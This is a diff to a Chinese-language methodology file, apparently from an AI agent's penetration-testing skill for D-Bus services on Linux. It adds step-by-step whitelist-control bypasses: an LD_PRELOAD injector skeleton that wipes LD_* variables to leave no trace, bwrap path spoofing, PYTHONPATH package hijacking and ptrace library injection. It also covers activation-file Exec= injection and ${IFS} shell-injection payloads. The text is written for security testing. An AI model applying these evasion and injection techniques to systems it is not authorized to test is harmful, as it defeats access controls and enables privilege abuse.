@@ -52,6 +52,7 @@ cat /usr/share/dbus-1/services/<服务名>.service
 
 ```bash
 cat /etc/dbus-1/system.d/<service>.conf | grep -A5 'context="default"'
+# 跨用户（非交互：先 sudo -n true 探测，不可免密用 setpriv --reuid=65534 --regid=65534 --clear-groups）
 sudo -u nobody dbus-send --system --print-reply --dest=<service> <object> <interface>.<method>
 ```
 
@@ -159,7 +160,8 @@ r = c.call_sync(None, '<对象路径>', '<接口>', '<方法>',
 print(r.unpack())
 EOF
 
-# 步骤 3：换用户连接（跨用户测试）
+# 步骤 3：换用户连接（跨用户测试；非交互：先 sudo -n true，不可免密改
+#          setpriv --reuid=65534 --regid=65534 --clear-groups python3 <同上脚本>）
 sudo -u nobody python3 <同上脚本>
 #   成功 → 服务日志会出现对端 uid（如 uid=65534）→ 跨用户边界突破
 ```
@@ -204,7 +206,140 @@ grep -E '^\[|=' /etc/dbus-1/conf/<总线名>.limit 2>/dev/null   # 看 [whitelis
 | `auth forbidden` | auth 层：严格服务校验真实 exe inode 不符，或 `[auth] RootOnly=true` |
 
 - 无任何管控配置的服务 → 直接测未授权调用，不存在绕过问题。
-- 确认管控后才按 [deep-exploitation.md](deep-exploitation.md)「D-Bus 管控（白名单）绕过」选方法（LD_PRELOAD 优先）；`RootOnly`/`rootcontrol=on` 客户端侧无解，直接放弃。
+- 确认管控后才按下节「白名单管控绕过（四法）」选方法（LD_PRELOAD 优先）；`RootOnly`/`rootcontrol=on` 客户端侧无解，直接放弃。
+
+---
+
+## 白名单管控绕过（四法，确认受控后才用）
+
+### 何时绕（约束）
+
+**只有确认目标服务存在白名单管控时才进入本节，不要上来就绕。** 无管控配置的服务直接按标准流程测未授权调用。
+
+先定性：
+
+1. **受控标志**：`/etc/dbus-1/conf/<总线名>.limit` 或 `/etc/kylin-config/basic/<服务>.yaml` 任一存在（内含 `[whitelist]`/`[rootcontrol]`/`[auth]`/`[envwhitelist]` 段）。
+2. **报错分层**：`operation not permitted -- Invalid client identity` = 身份层（cmdline/exe 路径不在白名单）；`auth forbidden` = auth 层（严格服务追加校验，或 `[auth] RootOnly=true`）。
+3. **攻击面本质**：身份层匹配的是**进程视角的路径字符串**（`/proc/pid/exe`、`/proc/pid/cmdline`），可伪造；严格服务追加 **inode 比对**（路径伪造无效），必须让进程真实运行白名单文件本身。
+
+### 方法选型（LD_PRELOAD 优先）
+
+| 场景 | 方法 |
+|------|------|
+| 白名单含非 setuid、world-exec 的真实 ELF | **① LD_PRELOAD**（严格+宽松通吃，首选） |
+| 严格服务且 env 注入被 LSM 在 exec 期拦截 | **④ ptrace 注入** |
+| 宽松服务（仅 cmdline 校验），白名单为任意路径 | **② bwrap 路径欺骗** |
+| 宽松服务 + 白名单项是 shebang→python 脚本 | **③ PYTHONPATH 劫持** |
+
+严格/宽松判别：`[rootcontrol] status=off` 或仅 yaml 配置多为宽松（只认 cmdline）；whitelist-only 配置多为严格（还认 inode）。不确定时先用 ②/③ 只读探针试一次定性（被拒=严格，转 ①）。
+
+### ① LD_PRELOAD 注入（首选）
+
+原理：代码注入白名单真实 ELF 进程内，进程真实 exe 就是白名单文件，身份层与 auth 层天然双满足。
+
+```bash
+gcc -shared -fPIC -o /tmp/inj.so inj.c -ldl
+LD_PRELOAD=/tmp/inj.so /usr/sbin/<白名单ELF>   # 非 setuid、world-exec
+```
+
+inj.c 关键骨架（constructor 内完成全部动作）：
+
+```c
+__attribute__((constructor)) static void init(void){
+    for (char **e = environ; e && *e; e++)                     // 构造期抹除 LD_*：
+        if (!strncmp(*e, "LD_", 3)) memset(*e, 0, strlen(*e)); // 服务查 /proc/pid/environ 时已是干净内存
+    void *h = dlopen("libdbus-1.so.3", RTLD_NOW|RTLD_GLOBAL);  // 必须运行时 dlopen
+    // dbus_bus_get(SYSTEM) → dbus_message_new_method_call →
+    // dbus_message_append_args → dbus_connection_send_with_reply_and_block
+    // 完成dbus调用后 _exit(0)
+}
+```
+
+注意：libdbus 符号不能链接期 extern（undefined symbol 被吞、.so 静默加载失败），必须 dlopen 运行时解析。
+局限：目标为 setuid 时 AT_SECURE 忽略 LD_PRELOAD；LSM 在 bprm/exec 阶段拒绝 LD_* env 时失效 → 转 ④。
+
+### ② bwrap 路径欺骗（宽松服务）
+
+原理：把自选可执行 bind-mount 到白名单路径再 exec，服务端读到的 `/proc/pid/exe` 与 `cmdline[0]` 均为白名单路径字符串；`--clearenv` 顺带清空 env（无 LD_PRELOAD 痕迹）。
+
+```bash
+bwrap --ro-bind / / --bind /run /run --bind /tmp /tmp --clearenv \
+      --bind /usr/bin/python3 "$WHITELIST_EXE" \
+      -- "$WHITELIST_EXE" "$INNER_SCRIPT"
+```
+
+局限：真实 inode 未变，严格服务（inode 比对）必拒；完整 PoC 见 poc-template.py 变体 `bwrap_whitelist_bypass`。
+
+### ③ PYTHONPATH 劫持（宽松服务，限 python 脚本白名单项）
+
+原理：白名单项为 shebang→python 脚本时，进程 `cmdline[1]`=脚本路径命中身份层；PYTHONPATH 目录优先级高于系统库，恶意同名包在 import 时执行，以白名单脚本身份**进程内**直接调 D-Bus。
+
+```bash
+mkdir -p evil/<脚本import的包名>
+echo '<进程内 Gio/dbus 调用目标方法>' > evil/<包名>/__init__.py
+PYTHONPATH=$PWD/evil /usr/bin/<白名单脚本>
+```
+
+注意：必须造包级 `__init__.py` 抢 sys.path 优先级，纯子包路径不生效。
+局限：仅限 python 解释器的 shebang 项，且脚本需 import 可抢占模块；严格服务被 inode 比对拒。
+
+### ④ ptrace 注入（env 向量被封时的替补）
+
+原理：干净 exec 白名单 ELF（env 全程无 LD_*，exec 期 env 检查无物可查）→ 附加 → 远程 mmap + 写入路径串 → 远程调 `__libc_dlopen_mode("/tmp/inj.so")` → 之后同 ①；恢复寄存器后 DETACH，宿主继续正常运行。
+
+```c
+// 子进程: clearenv(); setenv("PATH","/usr/bin",1);
+//         ptrace(PTRACE_TRACEME); execl(白名单ELF);
+// 父进程: waitpid → PTRACE_GETREGS 存档 → 远程 call mmap(RWX)
+//         → PTRACE_POKEDATA/process_vm_writev 写 "/tmp/inj.so"
+//         → 远程 call __libc_dlopen_mode(addr, RTLD_NOW)
+//         → 恢复原始 regs → PTRACE_DETACH
+```
+
+`__libc_dlopen_mode` 地址 = 注入器 dlsym 偏移 + 目标 `/proc/pid/maps` 中 libc 基址（同机同 glibc 通用）。
+局限：Yama（`kernel.yama.ptrace_scope`）限制跨进程附加；LSM 可在 ptrace 钩子拦截；目标 setuid 需 root。
+
+### 死路清单（勿浪费时间）
+
+- 包裹式 bwrap（不换路径包 busctl）、`exec -a` 改 argv0、prctl 改 comm、userns `--unshare-user --uid 0` —— 只改表象，任何服务都不认。
+- patchelf/复制白名单 ELF 后修改执行 —— 破坏真实 inode，严格服务必拒。
+- 显式 root 强制（`[auth] RootOnly=true` / `[rootcontrol] status=on`）—— 客户端侧无解，换目标。
+- 对**点对点 / 抽象套接字**服务尝试绕白名单——它不挂总线，**根本没有 daemon 侧管控可以绕**（见上方「第三种拓扑」）。
+
+---
+
+## D-Bus 激活文件注入（`Exec=` / `User=`）
+
+服务激活文件 `/usr/share/dbus-1/system-services/<服务>.service` 决定"谁、以什么命令"被 dbus-daemon 拉起。它本身就是一个攻击面：
+
+```bash
+# 1. 找到激活文件（组件边界内）
+ls -la /usr/share/dbus-1/system-services/<服务>.service /etc/dbus-1/system-services/<服务>.service 2>/dev/null
+
+# 2. 权限基线：普通用户可写？
+[ -w <激活文件> ] && echo "可写 → 直接注入 Exec="
+
+# 3. 内容检查：Exec= 是否含可注入变量/相对路径/可写脚本
+grep -E '^(Exec|User|SystemdService)=' <激活文件>
+#   Exec=/bin/sh -c '<命令>'        ← sh -c 即 shell，含变量即注入面
+#   Exec=/opt/<组件>/scripts/run.sh ← 脚本本身可写？(检查脚本权限)
+#   User=root                       ← 以 root 拉起
+```
+
+- **激活文件可写** → 改 `Exec=` 为任意命令（如 `/bin/sh -c 'touch /tmp/inj-marker;#'`），再触发一次该服务的任意方法调用（dbus-daemon 会拉起它）→ marker + owner uid 取证。
+- **`Exec=` 指向的脚本/包装器可写**（组件包内的 launcher）→ 注入脚本内容，效果同上。
+- 归属校验：激活文件必须以组件唯一标识命名才可测；否则归"关联观察"。
+
+---
+
+## 二阶（存储型）注入的四个要点
+
+判定方法见上方「参数签名与注入探测」第 3 条；实操要点：
+
+- **载荷写法**：被拼进 shell 时用 `${IFS}` 替代空格（`;touch${IFS}/tmp/x;#`），并单独校验载荷字段确已落盘。
+- **门控顺序不预设**：不假定"先注入再开闸"还是"先开闸再注入"，按实测行数/报错为准并记录证据（固定的顺序断言曾被他机证伪）。
+- **触发接口**：Qt 应用可用会话总线自动导出的 `org.qtproject.Qt.QWidget.close()` 触发关闭/退出路径，**无 GUI 交互即可完成整链**。
+- **权限边界**：结果通常为登录用户权限（不可越权）——报告须标注，并遵守 SKILL.md「可选扩展模式」的产出约定。完整模板见 poc-template.py 变体 `second_order_injection`。
 
 ---
 
